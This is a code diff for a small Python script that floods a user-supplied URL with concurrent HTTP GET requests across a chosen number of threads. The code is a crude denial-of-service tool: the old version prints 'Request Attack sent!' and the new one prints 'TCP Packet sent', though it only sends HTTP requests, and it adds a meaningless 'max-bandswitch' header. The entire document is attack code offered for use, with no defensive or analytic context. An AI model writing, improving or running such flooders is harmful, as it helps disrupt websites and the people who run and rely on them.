@@ -1,22 +1,25 @@
-import threading, requests
+import threading
+import requests
 
 url = input("URL: ")
-byte_s = int(input("Bytes: "))
+threads = int(input("Threads: "))
+
+headers = {'max-bandswitch': '2'}
+response = requests.get(url, headers=headers)
 
 
-def r_send():
+def request():
     try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            print(f"\033[32m[+]\033[0m Request Attack sent!")
+        requests.get(url, headers=headers)
+        print("\033[32m[+]\033[0m TCP Packet sent ->", url)
 
     except Exception as err:
-        print(err)
+        print("\033[31m[-]\033[0m", err)
 
 
-for i in range(byte_s):
-    thread = threading.Thread(target=r_send)
-    thread.start()
+if response.status_code == 200:
+    for i in range(threads):
+        t = threading.Thread(target=request)
+        t.start()
 
 input("")
-
